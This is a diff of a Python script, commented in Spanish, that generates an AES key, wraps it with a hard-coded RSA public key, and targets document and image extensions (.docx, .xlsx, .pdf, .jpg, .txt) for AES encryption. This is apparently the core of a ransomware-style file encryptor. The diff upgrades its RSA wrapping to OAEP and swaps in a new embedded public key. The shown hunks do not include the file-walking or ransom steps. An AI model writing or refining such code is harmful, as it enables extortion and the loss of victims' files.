@@ -1,9 +1,11 @@
 import os
-import rsa
 import base64
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.asymmetric import padding, rsa
+from cryptography.hazmat.primitives import serialization, hashes
 
 # Función para generar una clave AES aleatoria de 256 bits
 def generar_clave_aes():
@@ -11,8 +13,15 @@ def generar_clave_aes():
 
 # Función para cifrar la clave AES con RSA utilizando la llave pública proporcionada
 def cifrar_clave_aes_rsa(clave_aes, public_key_pem):
-    public_key = rsa.PublicKey.load_pkcs1(public_key_pem.encode())
-    clave_cifrada = rsa.encrypt(clave_aes, public_key)
+    public_key = serialization.load_pem_public_key(public_key_pem.encode(), backend=default_backend())
+    clave_cifrada = public_key.encrypt(
+        clave_aes,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
     return base64.b64encode(clave_cifrada).decode()
 
 # Función para cifrar archivos con AES
@@ -36,15 +45,15 @@ extensions = ['.docx', '.xlsx', '.pdf', '.jpeg', '.jpg', '.txt']
 # Generar clave AES
 clave_aes = generar_clave_aes()
 
-# Llave pública proporcionada
+# Llave pública proporcionada (en formato PKCS#8)
 public_key_pem = '''-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA9Ecl++68RzR8L2kzvUj4
-pWc0NSnXtz4BfOLqXLpYDWDIV9e1oS437VeZzf7rvxKUnjTmgu+PSU8P4ejwwN03
-9+HYtxyBBE1XJDz8jGwt4hzjlWmYBgVJEiySGZL2s6LPvtE2NGEubcgylGLXNbp9
-5uZsKuqP0SksLK5SHisoNxrDa86hisGyRDrKRFt2QOwKKM9TkP0LKJOGXZglAj8n
-zq3mBlVbmdJU36o/CkN9iG6x1iho+VcQV3k2oMuSah3Epf3bLMmtnMe7zihi37G6
-/AmcHnrJjBJ8F+a6ig3PCY+Ww6Z8kb6uXESOExDX86vmYrzMaNw9DN2pyuPcFipJ
-dQIDAQAB
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAk9c8fM3oEyNAWNylkTei
+Xe0U1GTDqgUCrjOCkoweLpnZr9JihFS888GbJiy+V7WqmFGO20tjsnRLFtgKveVa
+Lao0GQP2+cHRzDoXRqkb0Ukn1S/YM6u+BQY+5vwWceQxW10pi8nlasOz6Ua9TJaI
+vlEElXoh5AZUDrstUbuOPwaKsbMyj8iLnkcjGglMjSm5U6Scllaods3x/6SIuCSe
+Ijb8ZPqMzz5rhzkxQvmzl/PTXdchBHKClbQhurqB9oDc97dP46z6QoV+vfBH6ac5
++2eN9SUCa8rtxvifnfaltX8Z8Kj723fTI6ZLZhShjVl/BdV+PHdkeCC/3p58taX0
+iQIDAQAB
 -----END PUBLIC KEY-----'''
 
 # Cifrar la clave AES con RSA
